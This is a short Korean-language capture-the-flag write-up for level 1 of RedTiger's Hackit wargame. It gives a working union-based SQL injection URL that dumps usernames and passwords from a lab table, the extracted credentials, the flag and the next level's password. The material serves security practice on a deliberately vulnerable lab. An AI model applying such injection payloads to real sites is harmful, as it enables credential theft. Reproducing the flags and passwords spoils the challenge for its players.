# [RedTiger’s Hackit] Level 1 - Writeup

## Union Based SQL Injection
Union Based SQL Injection으로 힌트에 제시된 테이블에서 `Hornoxe`라는 유저의 패스워드를 획득할 수 있다.

[https://redtiger.labs.overthewire.org/level1.php?cat=2+union+select+1,2,username,password+from+level1_users%23](https://redtiger.labs.overthewire.org/level1.php?cat=2+union+select+1,2,username,password+from+level1_users%23)
```
Hornoxe
thatwaseasy
```

___

## Answer

flag: `27cbddc803ecde822d87a7e8639f9315`

next level password: `4_is_not_random`